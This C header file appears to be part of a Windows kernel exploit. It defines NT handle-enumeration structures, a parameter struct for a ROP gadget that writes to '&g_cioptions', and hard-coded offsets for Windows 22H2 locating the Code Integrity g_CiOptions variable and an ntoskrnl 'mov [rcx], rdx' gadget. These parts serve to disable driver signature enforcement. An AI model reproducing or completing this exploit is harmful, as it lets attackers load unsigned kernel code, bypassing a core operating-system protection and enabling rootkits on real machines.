#pragma once

#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <stdio.h>

#pragma comment (lib, "ntdll.lib")

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef struct _SYSTEM_HANDLE {
    ULONG ProcessId; // pid of the process which holds the handle
    BYTE ObjectTypeNumber;
    BYTE Flags;
    USHORT Handle;
    PVOID Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG HandleCount;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _OBJECT_BASIC_INFORMATION {
    ULONG                   Attributes;
    ACCESS_MASK             DesiredAccess;
    ULONG                   HandleCount;
    ULONG                   ReferenceCount;
    ULONG                   PagedPoolUsage;
    ULONG                   NonPagedPoolUsage;
    ULONG                   Reserved[3];
    ULONG                   NameInformationLength;
    ULONG                   TypeInformationLength;
    ULONG                   SecurityDescriptorLength;
    LARGE_INTEGER           CreationTime;
} OBJECT_BASIC_INFORMATION, * POBJECT_BASIC_INFORMATION;

typedef struct _OBJECT_NAME_INFORMATION {
    UNICODE_STRING          Name;
    WCHAR                   NameBuffer[0];
} OBJECT_NAME_INFORMATION, * POBJECT_NAME_INFORMATION;

typedef struct _IPC_SET_FUNCTION_RETURN_PARAM {
    UINT64 rip;         // gadget : mov [rcx], rdx ; ret
    UINT64 parameter;   // position: rcx --> &g_cioptions
} IPC_SET_FUNCTION_RETURN_PARAM, * PIPC_SET_FUNCTION_RETURN_PARAM;

typedef enum _WINDOWS_VERSION
{
    WINDOWS_UNSUPPORTED,
    WINDOWS_REDSTONE_1,		// 14393,
    WINDOWS_REDSTONE_2,		// 15063,
    WINDOWS_REDSTONE_3,		// 16299,
    WINDOWS_REDSTONE_4,		// 17134,
    WINDOWS_REDSTONE_5,		// 17763
    WINDOWS_19H1, 			// 18362
    WINDOWS_19H2,			// 18363
    WINDOWS_20H1,			// 19041
    WINDOWS_20H2,			// 19042
    WINDOWS_21H1,			// 19043
    WINDOWS_21H2,			// 19044
    WINDOWS_22H2            // 19045

} WINDOWS_VERSION;

const ULONG CI_G_CI_OPTIONS_OFFSET[] =
{
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x3A3D0
};

/* mov qword ptr[rcx], rdx */
const ULONG NTOSKRNL_GADGET_OFFSET[] =
{
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x0262d9c
};


typedef NTSTATUS    (NTAPI* PRTLGETVERSION)(_Out_ PRTL_OSVERSIONINFOW lpVersionInformation);
typedef NTSTATUS    (NTAPI* PNTQUERYSYSTEMINFORMATION)(_In_ int SystemInformationClass, _Inout_ PVOID SystemInformation, _In_ ULONG SystemInformationLength, _Out_opt_ PULONG ReturnLength);
typedef NTSTATUS    (NTAPI* PNTQUERYOBJECT)(_In_opt_ HANDLE Handle, _In_ int ObjectInfoClass, _Out_opt_ PVOID ObjectInformation, _In_ ULONG ObjectInformationLength, _Out_opt_ PULONG ReturnLength);
typedef BOOL        (WINAPI* PDEVICEIOCONTROL)(_In_ HANDLE hDevice, _In_ DWORD dwIoControlCode, _In_opt_ LPVOID lpInBuffer, _In_ DWORD nInBufferSize, _Out_opt_ LPVOID lpOutBuffer, _In_ DWORD nOutBufferSize, _Out_opt_ LPDWORD lpBytesReturned, _Inout_opt_ LPOVERLAPPED lpOverlapped);
typedef HLOCAL      (WINAPI* PLOCALALLOC) (__in UINT uFlags, __in SIZE_T uBytes);
typedef HLOCAL      (WINAPI* PLOCALFREE) (__deref HLOCAL hMem);
typedef int         (NTAPI* PWCSCMP)(const wchar_t* string1, const wchar_t* string2);